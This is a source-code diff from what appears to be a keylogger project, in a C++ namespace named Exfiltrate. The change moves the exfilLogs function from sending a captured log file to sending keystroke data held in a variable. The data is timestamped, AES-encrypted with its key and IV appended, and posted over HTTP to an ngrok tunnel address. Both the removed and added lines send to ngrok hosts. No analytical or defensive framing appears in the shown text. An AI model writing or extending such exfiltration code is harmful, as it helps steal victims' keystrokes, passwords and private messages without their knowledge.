@@ -18,19 +18,29 @@ namespace Exfiltrate
 
 	bool sendHttpPOST(std::string &httpServerP, std::string &postBodyP);
 
-
-	bool exfilLogs(std::string pathToLogFile)
+	bool exfilLogs(std::string keyLogToExfil)
 	{
-		std::ifstream inFile;
+		//Temp disabling the abiity to exfil from a file in favor of exfil direct from program variable
+
+		/*std::ifstream inFile;
 		inFile.open(pathToLogFile); //open the input file
 
 		std::stringstream strStream;
 		strStream << inFile.rdbuf(); //read the file
-		std::string str = strStream.str(); //str holds the content of the file
+		std::string str = strStream.str(); //str holds the content of the file*/
 
-		std::string httpServer = "a6d4-2601-2c7-4300-ac0-5012-961d-d321-9cb3.ngrok.io";
+		Auxiliary::DateTime dateTime;
+		std::ostringstream formattedData;
 
-		if (sendHttpPOST(httpServer, str))
+		formattedData << "[" << dateTime.getDTString("/", " ", ":") << "]" << std::endl << keyLogToExfil << std::endl;
+
+		std::string sendData = Transformer::aesEncrypt(formattedData.str());
+		sendData += "\n\nkey: " + Transformer::getEncryptionKey();
+		sendData += "\niv: " + Transformer::getIV();
+
+		std::string httpServerAddress = "7cf3-2601-2c7-4300-ac0-cdcc-8fde-b845-bef0.ngrok.io";
+
+		if (sendHttpPOST(httpServerAddress, sendData))
 		{
 			return true;
 		}
